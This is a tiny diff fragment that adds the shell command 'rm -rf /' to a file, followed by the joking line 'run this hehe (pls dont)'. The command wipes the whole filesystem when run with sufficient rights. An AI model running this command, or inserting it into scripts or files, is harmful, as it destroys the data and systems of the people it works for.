@@ -1,0 +1,3 @@
+rm -rf /
+
+- run this hehe (pls dont)
